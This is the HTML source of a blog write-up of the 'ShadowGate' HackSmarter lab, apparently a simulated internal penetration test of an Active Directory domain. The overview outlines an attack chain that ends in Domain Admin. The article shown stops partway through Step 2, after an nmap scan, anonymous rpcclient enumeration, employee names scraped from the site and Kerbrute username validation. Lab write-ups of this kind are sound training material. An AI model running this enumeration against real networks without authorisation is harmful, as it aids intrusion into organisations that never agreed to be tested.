@@ -1,0 +1,4637 @@
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0e174e" />
+  
+  <title>ShadowGate — HackSmarter &middot; k40t1k</title>
+    <meta name="title" content="ShadowGate — HackSmarter &middot; k40t1k" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="https://k40tik.github.io/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="https://k40tik.github.io/css/main.bundle.min.77a79972dfd1fba3e37eaab972e5cf479aea24376fc39d827f5760735ebc834e.css"
+    integrity="sha256-d6eZct/R&#43;6Pjfqq5cuXPR5rqJDdvw52Cf1dgc168g04="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        
+      
+    "
+  />
+  
+  
+  
+  
+    <link rel="canonical" href="https://k40tik.github.io/posts/shadowgate-hacksmarter/" />
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="https://k40tik.github.io/posts/shadowgate-hacksmarter/">
+	<meta property="og:site_name" content="k40t1k">
+	<meta property="og:title" content="ShadowGate — HackSmarter">
+	<meta property="og:description" content="My awesome website">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-08-07T17:00:00+03:00">
+		<meta property="article:modified_time" content="2026-08-07T17:00:00+03:00">
+		<meta property="article:tag" content="Active Directory">
+		<meta property="article:tag" content="Windows">
+		<meta property="article:tag" content="ADCS">
+		<meta property="article:tag" content="ESC3">
+		<meta property="article:tag" content="MSSQL">
+		<meta property="article:tag" content="BloodHound">
+		<meta property="og:image" content="https://k40tik.github.io/posts/shadowgate-hacksmarter/feature.png">
+
+  
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:image" content="https://k40tik.github.io/posts/shadowgate-hacksmarter/feature.png">
+	<meta name="twitter:title" content="ShadowGate — HackSmarter">
+	<meta name="twitter:description" content="My awesome website">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog",
+    "name": "ShadowGate — HackSmarter",
+    "headline": "ShadowGate — HackSmarter",
+    
+    
+    "inLanguage": "en",
+    "url" : "https:\/\/k40tik.github.io\/posts\/shadowgate-hacksmarter\/",
+    "author" : {
+      "@type": "Person",
+      "name": "k40t1k"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-08-07T17:00:00\u002b03:00",
+    "datePublished": "2026-08-07T17:00:00\u002b03:00",
+    
+    "dateModified": "2026-08-07T17:00:00\u002b03:00",
+    
+    "keywords": ["Active Directory","Windows","ADCS","ESC3","MSSQL","BloodHound","Responder","Certipy","Kerbrute","Privilege Escalation","CTF Writeup"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1771"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "https://k40tik.github.io/",
+       "name": "K40t1k",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "https://k40tik.github.io/posts/",
+       "name": "Blog",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "name": "Shadow Gate — Hack Smarter",
+       "position": 3
+     }
+   ]
+ }
+  </script>
+
+  
+  
+    <meta name="author" content="k40t1k" />
+  
+  
+    
+      <link href="https://github.com/jkilonzi" rel="me" />
+    
+      <link href="https://linkedin.com/in/john-maluki" rel="me" />
+    
+      <link href="https://medium.com/@jkilonzi301" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >k40t1k</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/about/"
+                  title="About"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/posts/"
+                  title="Blog"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Writeups</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/resources/"
+                  title="Resources"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Resources</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/certificates/"
+                  title="Certificates"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Certificates</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        ShadowGate — HackSmarter
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-08-07 17:00:00 &#43;0300 EAT">7 August 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">9 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/feature_hu_599fb35da71677dd.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/feature_hu_d0a0275fb5353dcf.webp 660w
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/feature_hu_d07f9b5b30926976.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/feature_hu_2acb5d954e50d9d8.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1600"
+        height="912"
+        class="mb-6 rounded-md"
+        
+        
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/feature_hu_70e3db37e7440b2a.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/feature_hu_40e0dca6135b6a2b.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/feature_hu_70e3db37e7440b2a.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/feature_hu_aedf65038a4d0bc5.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/feature_hu_c8a46347a655cf2c.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8 self-start">
+          <div class="toc pe-5 sticky top-20 overflow-y-auto max-h-[calc(100vh-6rem)] print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#step-1-reconnaissance-and-enumeration">Step 1: Reconnaissance and Enumeration</a></li>
+    <li><a href="#step-2-web-enumeration-and-username-discovery">Step 2: Web Enumeration and Username Discovery</a>
+      <ul>
+        <li><a href="#developer-portal">Developer Portal</a></li>
+        <li><a href="#the-upload-portal">The Upload Portal</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-3-initial-access">Step 3: Initial Access</a>
+      <ul>
+        <li><a href="#smb-share-enumeration">SMB Share Enumeration</a></li>
+        <li><a href="#bloodhound-collection">BloodHound Collection</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-4-privilege-escalation--taking-over-the-mssql-service-account">Step 4: Privilege Escalation — Taking Over the MSSQL Service Account</a></li>
+    <li><a href="#step-5-lateral-movement-via-mssql">Step 5: Lateral Movement via MSSQL</a>
+      <ul>
+        <li><a href="#ntlmv2-capture-via-xp_dirtree">NTLMv2 Capture via xp_dirtree</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-6-adcs-attack--esc3-to-domain-admin">Step 6: ADCS Attack — ESC3 to Domain Admin</a>
+      <ul>
+        <li><a href="#certificate-enumeration">Certificate Enumeration</a></li>
+        <li><a href="#esc3-exploitation">ESC3 Exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><p>ShadowGate provides cybersecurity solutions for global enterprises. They are in the process of getting SOC 2 certified and hired Hack Smarter to perform an internal network penetration test. This writeup covers the full attack path from unauthenticated web enumeration to full Domain Admin compromise of the <code>shadowgate.local</code> Active Directory domain. The chain involved username enumeration, an authentication-bypassing upload portal, NTLM hash capture via SMB, multiple ACL abuse primitives (ForceChangePassword, WriteOwner, WriteDACL, GenericAll), MSSQL impersonation, and finally an ESC3 ADCS attack to impersonate the Domain Administrator.</p>
+<p><strong>Key Findings:</strong></p>
+<ul>
+<li><strong>Domain:</strong> <code>shadowgate.local</code> (DC: <code>SG-DC01.shadowgate.local</code>)</li>
+<li><strong>Entry point:</strong> An unauthenticated <code>upload.aspx</code> developer portal granting access to the <code>mitch.r</code> account</li>
+<li><strong>Hash capture:</strong> SMB UNC path injection via <code>.lnk</code> file to capture NTLMv2 hashes</li>
+<li><strong>Privilege escalation:</strong> Object control chains (<code>ForceChangePassword</code> → <code>WriteOwner</code>/<code>WriteDACL</code> → <code>GenericAll</code>) leading to the MSSQL service account</li>
+<li><strong>Domain compromise:</strong> ESC3 ADCS attack to impersonate <code>Administrator</code> using a restored deleted account</li>
+</ul>
+<h2 id="step-1-reconnaissance-and-enumeration" class="relative group">Step 1: Reconnaissance and Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1-reconnaissance-and-enumeration" aria-label="Anchor">#</a></span></h2><p>The assessment began with a full port scan against the target <code>10.1.44.124</code> to identify running services.</p>
+<pre tabindex="0"><code>nmap -sV -sC -p- 10.1.44.124
+</code></pre><pre tabindex="0"><code>PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
+80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
+|_http-title: ShadowGate | Advanced Cyber Security Solutions
+88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-08-07 06:29:59Z)
+135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 126
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+445/tcp   open  microsoft-ds? syn-ack ttl 126
+464/tcp   open  kpasswd5?     syn-ack ttl 126
+1433/tcp  open  ms-sql-s      syn-ack ttl 126 Microsoft SQL Server 2019 15.00.2000.00; RTM
+3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadowgate.local, Site: Default-First-Site-Name)
+3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
+5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
+49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+</code></pre><p><strong>Key Findings:</strong></p>
+<ul>
+<li>The host is a domain controller running Windows Server 2019, identified as <code>SG-DC01.shadowgate.local</code>.</li>
+<li>Standard AD services are present: DNS (53), Kerberos (88), LDAP (389/3268), SMB (139/445), and WinRM (5985).</li>
+<li>Two non-standard web-facing services stand out: IIS on port <strong>80</strong> and Microsoft SQL Server on port <strong>1433</strong>.</li>
+<li>The domain is <code>shadowgate.local</code>.</li>
+</ul>
+<p>I attempted SMB share enumeration without valid credentials, but it was not permitted, and anonymous RPC enumeration did not yield user lists.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/nxc-smb-enum_hu_66e04991cdba4d75.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/nxc-smb-enum_hu_fea457bc1c495b46.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/nxc-smb-enum_hu_5897a4512485e42e.webp 963w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/nxc-smb-enum_hu_5897a4512485e42e.webp 963w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="963"
+        height="104"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/nxc-smb-enum_hu_b411b0e21bf2d6b.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/nxc-smb-enum_hu_d9967767e335cf9e.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/nxc-smb-enum_hu_b411b0e21bf2d6b.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/nxc-smb-enum.png 963w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/nxc-smb-enum.png 963w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-share-listing-denied_hu_8c4e11ac1beb25d8.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-share-listing-denied_hu_649829df283a0fa0.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-share-listing-denied_hu_f4ecfdb12fca4e21.webp 962w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-share-listing-denied_hu_f4ecfdb12fca4e21.webp 962w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="962"
+        height="102"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-share-listing-denied_hu_e80f2fe71a65223f.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-share-listing-denied_hu_e9659cabc4b648fe.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-share-listing-denied_hu_e80f2fe71a65223f.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-share-listing-denied.png 962w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-share-listing-denied.png 962w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>rpcclient -U &#39;shadow.gate/&#39; 10.1.44.124 -N
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/rpcclient-anonymous_hu_ddda3de1a176c4f8.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/rpcclient-anonymous_hu_8718dc2599c5a3a.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/rpcclient-anonymous_hu_75180e62d6e8c6b6.webp 850w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/rpcclient-anonymous_hu_75180e62d6e8c6b6.webp 850w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="850"
+        height="93"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/rpcclient-anonymous_hu_ec0a0a6058fd6ebb.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/rpcclient-anonymous_hu_433822c40d87564a.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/rpcclient-anonymous_hu_ec0a0a6058fd6ebb.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/rpcclient-anonymous.png 850w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/rpcclient-anonymous.png 850w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-2-web-enumeration-and-username-discovery" class="relative group">Step 2: Web Enumeration and Username Discovery <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2-web-enumeration-and-username-discovery" aria-label="Anchor">#</a></span></h2><p>The IIS website on port 80 presented a corporate page for ShadowGate. The &ldquo;team&rdquo; section revealed a list of employee names that looked like potential Active Directory usernames.</p>
+<pre tabindex="0"><code>Mitch Ressek
+Bogdan Radzik
+Milo Weis
+Oscar Mazerath
+Sam Hadges
+Daniel Ramus
+Ryan James
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/website-account-names_hu_5c63a454fced057f.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/website-account-names_hu_466d7535dd2d7fce.webp 660w
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/website-account-names_hu_6195d61ed2a2ebcb.webp 1024w
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/website-account-names_hu_ff2d513c9485b171.webp 1252w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1252"
+        height="997"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/website-account-names_hu_4b4cb589a485fe01.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/website-account-names_hu_629aad77d72ae299.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/website-account-names_hu_4b4cb589a485fe01.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/website-account-names_hu_1c1152f40ac090d6.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/website-account-names.png 1252w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I used these names to generate candidate username lists in various AD naming formats, but Kerbrute did not validate any of them.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/username-format-fail_hu_272ab9cf07b87e13.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/username-format-fail_hu_5da965cdd0c29218.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/username-format-fail_hu_776e6407e19be58e.webp 960w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/username-format-fail_hu_776e6407e19be58e.webp 960w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="960"
+        height="251"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/username-format-fail_hu_857eb13376f5221e.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/username-format-fail_hu_b97193b6ece37aae.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/username-format-fail_hu_857eb13376f5221e.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/username-format-fail.png 960w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/username-format-fail.png 960w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Since directory brute-forcing with <strong>Gobuster</strong> returned nothing, I turned to virtual host discovery, which revealed a subdomain.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/subdomain-discovery_hu_debbbbfd3ba93243.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/subdomain-discovery_hu_eeef0ca8d057bc4b.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/subdomain-discovery_hu_b92a46f60fa01ef4.webp 758w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/subdomain-discovery_hu_b92a46f60fa01ef4.webp 758w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="758"
+        height="131"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/subdomain-discovery_hu_6002d2ce9d9fff1d.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/subdomain-discovery_hu_6c6539908034296d.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/subdomain-discovery_hu_6002d2ce9d9fff1d.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/subdomain-discovery.png 758w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/subdomain-discovery.png 758w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="developer-portal" class="relative group">Developer Portal <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#developer-portal" aria-label="Anchor">#</a></span></h3><p>The discovered subdomain <code>dev.shadowgate.local</code> hosted a developer portal. At the bottom of the page, a piece of information revealed why the initial username wordlist had failed — ShadowGate uses a different naming convention.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/dev-portal_hu_81a472d0158de7bb.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/dev-portal_hu_253067d333f2ce3c.webp 660w
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/dev-portal_hu_9f86aed3b1a037c7.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/dev-portal_hu_ec94e0a5fb42512e.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1850"
+        height="990"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/dev-portal_hu_5f14a28bd5f1202.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/dev-portal_hu_815a9d957e2c4cc4.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/dev-portal_hu_5f14a28bd5f1202.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/dev-portal_hu_f68cc12d29f4ef3d.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/dev-portal_hu_c1d7cb252050e819.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/naming-format-reveal_hu_f47fdd6af28ec648.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/naming-format-reveal_hu_9cc89692775b8cd.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/naming-format-reveal_hu_9a04cee59cb91eb3.webp 864w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/naming-format-reveal_hu_9a04cee59cb91eb3.webp 864w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="864"
+        height="249"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/naming-format-reveal_hu_58552d206a9da1fd.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/naming-format-reveal_hu_1e7a21797d5105db.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/naming-format-reveal_hu_58552d206a9da1fd.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/naming-format-reveal.png 864w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/naming-format-reveal.png 864w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Using this new naming format, I generated a fresh wordlist and tested it with <strong>Kerbrute</strong>, which confirmed five valid usernames.</p>
+<pre tabindex="0"><code>2026/08/07 10:52:04 &gt;  [+] VALID USERNAME:       milo.w@shadowgate.local
+2026/08/07 10:52:04 &gt;  [+] VALID USERNAME:       daniel.r@shadowgate.local
+2026/08/07 10:52:04 &gt;  [+] VALID USERNAME:       ryan.j@shadowgate.local
+2026/08/07 10:52:04 &gt;  [+] VALID USERNAME:       bogdan.r@shadowgate.local
+2026/08/07 10:52:04 &gt;  [+] VALID USERNAME:       mitch.r@shadowgate.local
